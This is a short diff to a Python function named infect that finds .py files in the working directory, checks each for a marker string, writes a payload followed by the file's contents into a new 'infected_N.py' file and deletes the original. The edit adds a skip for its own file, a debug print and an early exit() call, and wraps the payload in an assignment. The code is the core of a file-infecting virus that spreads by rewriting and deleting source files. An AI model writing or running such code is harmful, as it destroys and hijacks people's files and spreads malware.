@@ -28,13 +28,17 @@ def infect(PAYLOAD):
     i = 0
     for file in glob.glob("*.py"):
         f = open(file, "r")
-        
+        if file == __file__:
+            continue
+
+        print(f.read())
         x = re.search('#### t45r6fye',f.read())
         
+        exit()
         if f.mode == 'r' and x == None:
             f.seek(0)
             infected = open('infected_'+str(i)+'.py','w')
-            infected.write(str(PAYLOAD) + str(f.read()))
+            infected.write("_x = " + str(PAYLOAD) + str(f.read()))
             f.close()
             infected.close()
             os.remove(file)
